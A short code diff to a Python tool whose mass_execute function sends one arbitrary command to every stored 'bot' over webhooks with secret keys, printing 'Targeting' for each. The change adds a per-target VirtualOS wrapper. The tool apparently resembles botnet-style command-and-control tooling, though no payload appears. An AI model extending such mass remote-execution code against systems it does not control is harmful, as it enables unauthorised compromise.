@@ -3,6 +3,7 @@ from rich.console import Console
 from rich.table import Table
 from core.bot_db import load_bots, remove_bot
 from core.agent_comm import AgentCommunicator
+from core.virtual_os import VirtualOS
 
 console = Console()
 
@@ -29,8 +30,8 @@ def mass_execute(command: str):
     for tid, data in bots.items():
         console.print(f"[*] Targeting {tid}...")
         comm = AgentCommunicator(data['webhook_url'], data['secret_key'])
-        # 不需要虚拟 OS，直接作为无状态命令下发
-        success, output = comm.execute_command(command)
+        vos = VirtualOS(tid)
+        success, output = comm.execute_command(command, vos)
         if success:
             console.print(f"[green][+] {tid} Response:[/green]\n{output.strip()}")
         else:
